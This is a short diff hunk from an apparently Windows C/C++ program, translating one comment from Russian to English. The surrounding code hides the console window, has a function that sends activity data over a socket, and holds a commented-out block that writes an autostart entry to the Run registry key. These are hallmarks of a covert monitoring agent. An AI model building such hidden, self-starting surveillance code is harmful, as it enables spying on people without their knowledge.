@@ -141,7 +141,7 @@ void SendActivityData(SOCKET clientSocket) {
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    /* Разкоментить и поставить нужный appPath
+    /* Uncomment after filling appPath
     HKEY hKey;
     const char* appPath = "\"C:\\...\"";
     const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
